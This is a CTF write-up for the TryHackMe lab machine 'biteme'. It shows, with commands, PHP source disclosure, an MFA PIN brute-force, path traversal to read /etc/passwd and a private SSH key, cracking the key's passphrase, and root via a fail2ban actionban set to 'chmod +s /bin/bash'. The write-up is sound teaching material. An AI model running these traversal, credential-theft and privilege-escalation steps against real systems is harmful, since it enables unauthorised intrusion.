# CTF Write-up: biteme — TryHackMe

| | |
|---|---|
| **Platform**   | TryHackMe |
| **Machine**    | biteme |
| **Difficulty** | Medium |
| **Tags**       | `PHP Source Disclosure` `MFA Bypass` `LFI` `fail2ban PrivEsc` |

---

## Introduction

biteme is a box that rewards methodical thinking. The path in involves reading obfuscated JavaScript to decode a hidden username, crafting a password that satisfies an unusual validation rule, and then brute-forcing a poorly implemented MFA system. Once inside, a file viewer with LFI exposes an SSH key that gets us a shell. Root comes through exploiting a writable fail2ban action configuration. Every step has a puzzle to solve.

---

## Step 1 — Reconnaissance (Nmap)

```bash
sudo nmap -sS -Pn -p- <target-ip>
sudo nmap -sC -sV -Pn -p22,80 <target-ip>
```

Two ports open:

- **Port 22** — SSH (OpenSSH 7.6p1)
- **Port 80** — HTTP (Apache 2.4.29)

The Apache server served a default Ubuntu page at the root. Time to enumerate.

---

## Step 2 — Directory Enumeration

```bash
ffuf -v -c -w /usr/share/dirb/wordlists/common.txt -u http://<target-ip>/FUZZ -t 100 -fc 404,403
```

Found `/console` — a login page with a CAPTCHA.

---

## Step 3 — Reading Obfuscated Source Code

The login page at `/console/index.php` contained obfuscated JavaScript. Deobfuscating the packed code revealed a message from "fred" to "jason":

> @fred I turned on php file syntax highlighting for you to review... jason

PHP syntax highlighting: if a file exists as `.phps` instead of `.php`, the server returns the colour-highlighted source code of the script.

```http
GET /console/index.phps
```

The source code of `index.php` was returned. It showed that authentication calls two functions: `is_valid_user()` and `is_valid_pwd()`. Checking `functions.phps` and `config.phps` revealed:

- The valid username was stored as ASCII hex in `config.php`:

  ```
  6a61736f6e5f746573745f6163636f756e74
  ```

  Converted: `jason_test_account`

- The valid password was any string whose MD5 hash ends in `001`. Wrote a quick Python script to find one: `password = 5265`

---

## Step 4 — Bypassing MFA

Logging in with `jason_test_account` / `5265` redirected to `mfa.php` asking for a 4-digit PIN. The JavaScript on that page (also obfuscated) decoded to:

> @fred we need to put some brute force protection on here, remind me in the morning... jason

No brute force protection. The PIN was randomly generated between 1000 and 3000 (visible in `mfa.phps`). Wrote a Python script to iterate all values in that range, checking responses for the absence of "Incorrect code":

```
Valid PIN: 2055 (varies per session)
```

Now inside the dashboard.

---

## Step 5 — LFI → SSH Key → Shell

The dashboard had two features: a file browser and a file viewer. The file viewer accepted raw paths. Tested it:

```
view=../../../../etc/passwd    — returned /etc/passwd content
```

Full LFI. Two users: `jason` and `fred`. Grabbed jason's private SSH key:

```
view=/home/jason/.ssh/id_rsa
```

The key was encrypted. Converted it to John format and cracked it:

```bash
ssh2john id_rsa > hash.txt
john -w=/usr/share/wordlists/rockyou.txt hash.txt
```

```
Passphrase: 1a2b3c4d
```

SSH in:

```bash
ssh -i id_rsa jason@<target-ip>
# (passphrase: 1a2b3c4d)

cat /home/jason/user.txt
```

> **FLAG:** `[user flag here]`

---

## Step 6 — Pivoting to fred

```bash
sudo -l
```

`jason` could run anything as `fred` with no password:

```
(fred) NOPASSWD: ALL
```

```bash
sudo -u fred bash
```

Now operating as `fred`.

---

## Step 7 — Privilege Escalation (fail2ban Action Override)

```bash
sudo -l   # (as fred)
```

`fred` could run `/bin/systemctl restart fail2ban` as root without a password. Checked which fail2ban config files were writable:

```bash
find /etc/fail2ban/ -writable 2>/dev/null
# /etc/fail2ban/action.d/iptables-multiport.conf
```

The `actionban` directive in that file runs whenever an IP gets banned. Modified it to set the SUID bit on `/bin/bash`:

```ini
actionban = chmod +s /bin/bash
```

Restarted fail2ban to load the new config:

```bash
sudo /bin/systemctl restart fail2ban
```

Triggered a ban by running Hydra against the SSH port from the attack machine with intentionally wrong credentials:

```bash
hydra -I -V -f -t 16 -l test -P /usr/share/wordlists/rockyou.txt ssh://<target-ip> -s 22
```

fail2ban banned the IP and executed the `actionban` — which ran `chmod +s /bin/bash` as root.

```bash
/bin/bash -p

whoami
# root
```

---

## Step 8 — Root Flag

```bash
cat /root/root.txt
```

> **FLAG:** `[root flag here]`

---

## Summary & Takeaways

A layered, puzzle-heavy box:

1. PHP source disclosure (`.phps`) revealed the login logic.
2. Decoded username from hex; crafted a magic-hash password.
3. Brute-forced an unprotected MFA PIN between 1000–3000.
4. LFI on the dashboard extracted jason's encrypted SSH key.
5. Cracked the key, SSH'd in; sudo to fred trivially.
6. Writable fail2ban action + sudo restart = root via banip trigger.

The biggest lesson: comments in obfuscated JS still leak intent. And a world-writable file in fail2ban's `action.d` is a privilege escalation waiting to happen.
